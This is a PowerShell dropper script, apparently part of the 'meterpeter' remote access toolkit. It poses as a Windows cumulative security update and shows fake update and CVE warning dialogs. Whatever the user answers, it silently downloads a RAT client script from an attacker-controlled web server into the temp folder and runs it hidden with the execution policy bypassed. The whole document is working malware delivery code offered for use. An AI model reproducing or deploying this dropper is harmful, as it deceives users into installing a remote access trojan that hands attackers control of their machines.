<#
.SYNOPSIS
   meterpeter EXE dropper download\execution

   Author: r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Invoke-WebRequest {native}
   Optional Dependencies: ps2exe.ps1 {meterpeter native}
   PS cmdlet Dev version: v1.0.0

.DESCRIPTION
   This cmdlet downloads\executes meterpeter client.ps1 (rat) from attacker
   machine python (http.server) or apache2 webservers into target $Env:TMP
   directory then executes the client.ps1 in an child process. (background)

.EXAMPLE
   PS C:\> .\Update-KB4524147.exe
   Automatic exploitation (default settings)
   
.OUTPUTS
   This cmdlet uses Wscript.Shell ComObject to display msgbox
#>

$ErrorActionPreference = "SilentlyContinue"
$host.UI.RawUI.WindowTitle = "Cumulative Security KB4524147 Update"
$UserSet = powershell (New-Object -ComObject Wscript.Shell).Popup("                                                Feature update                                                `n`nTHIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`n`n                            Install Cumulative Security KB4524147 Update?",6,"                            Cumulative Security KB4524147 Update",1+0)
iwr -Uri "http://CharlieBrown/Update-KB4524147.ps1" -OutFile "$Env:TMP\Update-KB4524147.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-exec bypass -File $Env:TMP\Update-KB4524147.ps1"|Out-Null
If($UserSet -eq 1)
{
   powershell (New-Object -ComObject Wscript.Shell).Popup("system successfully updated! - Version: 45.19041.964.0",5,"                         Cumulative Security KB4524147 Update",0+64)|Out-Null
}
Else
{
   powershell (New-Object -ComObject Wscript.Shell).Popup("KB4524147 - Cumulative security update aborted ..`nThis update adresses Microsoft Team Foundation Server.`nDisclosure assigned to CVE-2019-0971 as critical update.`n'Please address this vulnerability as soon as possible'.",8,"                      Cumulative Security KB4524147 Update",0+16)|Out-Null
   Start-Process "https://www.cvedetails.com/cve/CVE-2019-0971/"
}
exit
